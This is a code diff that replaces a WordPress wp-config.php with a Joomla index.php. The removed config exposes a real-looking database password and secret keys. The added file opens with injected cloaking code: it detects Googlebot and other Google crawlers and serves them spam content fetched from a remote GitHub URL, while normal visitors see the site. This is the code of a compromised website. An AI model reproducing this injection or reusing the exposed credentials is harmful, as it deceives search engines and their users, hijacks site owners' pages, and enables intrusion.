@@ -1,102 +1,81 @@
 <?php
-
-
-
-
-/**
- * The base configuration for WordPress
- *
- * The wp-config.php creation script uses this file during the installation.
- * You don't have to use the website, you can copy this file to "wp-config.php"
- * and fill in the values.
- *
- * This file contains the following configurations:
- *
- * * Database settings
- * * Secret keys
- * * Database table prefix
- * * ABSPATH
- *
- * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
- *
- * @package WordPress
- */
-
-// ** Database settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', "cupofuji_db" );
-
-/** Database username */
-define( 'DB_USER', "cupofuji_db" );
-
-/** Database password */
-define( 'DB_PASSWORD', "9BexW,3C6Z@]" );
-
-/** Database hostname */
-define( 'DB_HOST', "localhost" );
-
-/** Database charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8mb4' );
-
-/** The database collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
-
-define('DISALLOW_FILE_MODS', true);
-/**#@+
- * Authentication unique keys and salts.
- *
- * Change these to different unique phrases! You can generate these using
- * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
- *
- * You can change these at any point in time to invalidate all existing cookies.
- * This will force all users to have to log in again.
- *
- * @since 2.6.0
- */
-define( 'AUTH_KEY',         'fherrbw2j5smcoerkkrqqpjb00mfhjv13nauaiiaexoh2snhtc3gqvtf9wcrvahz' );
-define( 'SECURE_AUTH_KEY',  'gbsiynxpztk3fsubvkww4wuzqixzkwyikkmv4w5r85iw76l5fffdbw20htxayris' );
-define( 'LOGGED_IN_KEY',    'jifer8ldfgqnw6lywruanohmrjqsububwb12cuzsjfyfolybt0xo1drcxifwdwim' );
-define( 'NONCE_KEY',        'al7enz2peyyzmuml9j6pmjgsuvlsoxlamxsvkcwrhwjlrruwymkj7nvuuoxfakqm' );
-define( 'AUTH_SALT',        'tz77j6gkmnvvjgjix4tvl0lqc1qqc3qji5wdvn3mhpkzyhrdfextyqx4pa1kskam' );
-define( 'SECURE_AUTH_SALT', 'mbyqtoqumnei3jtwc7pphr8rz1lmkew45xmo9pwmm7urx6l1pbjhf2bucnihsqmg' );
-define( 'LOGGED_IN_SALT',   'bgeaimeor3oyy8mg4poc6gsgopv4ajyv9rhmfqnncumgjzpaku7gfshojtr0zig9' );
-define( 'NONCE_SALT',       'bztqsko2dzlzdmzbnqntwaxeuyznydnzvn6yvvsmifjuotrbmete0tppjk6x2uvp' );
-
-/**#@-*/
-
-/**
- * WordPress database table prefix.
- *
- * You can have multiple installations in one database if you give each
- * a unique prefix. Only numbers, letters, and underscores please!
- */
-$table_prefix = 'wppx_';
-
-/**
- * For developers: WordPress debugging mode.
- *
- * Change this to true to enable the display of notices during development.
- * It is strongly recommended that plugin and theme developers use WP_DEBUG
- * in their development environments.
- *
- * For information on other constants that can be used for debugging,
- * visit the documentation.
- *
- * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
- */
-define( 'WP_DEBUG', false );
-
-/* Add any custom values between this line and the "stop editing" line. */
-
-
-
-define( 'DUPLICATOR_AUTH_KEY', ',vWt@;WO+t(n*T&&ml&<#J[fK09Hg8o}3P|o0m^UGtHnav#CY6[fS$o(p:ao78nb' );
-/* That's all, stop editing! Happy publishing. */
-
-/** Absolute path to the WordPress directory. */
-if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', dirname(__FILE__) . '/' );
+function is_google_bot() {
+    $agents = array(
+        "Googlebot", 
+        "AdsBot-Google", 
+        "Mediapartners-Google", 
+        "Google-Site-Verification", 
+        "Google-InspectionTool", 
+        "Googlebot-Mobile", 
+        "Googlebot-News"
+    );
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($agents as $agent) {
+        if (strpos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
 }
 
-/** Sets up WordPress vars and included files. */
-require_once ABSPATH . 'wp-settings.php';
+if (is_google_bot()) {
+    echo file_get_contents("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/pisupplies-hbod.txt");
+    exit;
+}
+
+/**
+ * @package    Joomla.Site
+ *
+ * @copyright  (C) 2017 Open Source Matters, Inc. <https://www.joomla.org>
+ * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+\defined('_JEXEC') or die;
+
+// Saves the start time and memory usage.
+$startTime = microtime(1);
+$startMem  = memory_get_usage();
+
+if (file_exists(\dirname(__DIR__) . '/defines.php')) {
+    include_once \dirname(__DIR__) . '/defines.php';
+}
+
+require_once __DIR__ . '/defines.php';
+
+// Check for presence of vendor dependencies not included in the git repository
+if (!file_exists(JPATH_LIBRARIES . '/vendor/autoload.php') || !is_dir(JPATH_PUBLIC . '/media/vendor')) {
+    echo file_get_contents(JPATH_ROOT . '/templates/system/build_incomplete.html');
+
+    exit;
+}
+
+require_once JPATH_BASE . '/includes/framework.php';
+
+// Set profiler start time and memory usage and mark afterLoad in the profiler.
+JDEBUG && \Joomla\CMS\Profiler\Profiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad');
+
+// Boot the DI container
+$container = \Joomla\CMS\Factory::getContainer();
+
+/*
+ * Alias the session service keys to the web session service as that is the primary session backend for this application
+ *
+ * In addition to aliasing "common" service keys, we also create aliases for the PHP classes to ensure autowiring objects
+ * is supported.  This includes aliases for aliased class names, and the keys for aliased class names should be considered
+ * deprecated to be removed when the class name alias is removed as well.
+ */
+$container->alias('session.web', 'session.web.site')
+    ->alias('session', 'session.web.site')
+    ->alias('JSession', 'session.web.site')
+    ->alias(\Joomla\CMS\Session\Session::class, 'session.web.site')
+    ->alias(\Joomla\Session\Session::class, 'session.web.site')
+    ->alias(\Joomla\Session\SessionInterface::class, 'session.web.site');
+
+// Instantiate the application.
+$app = $container->get(\Joomla\CMS\Application\SiteApplication::class);
+
+// Set the application as global app
+\Joomla\CMS\Factory::$application = $app;
+
+// Execute the application.
+$app->execute();
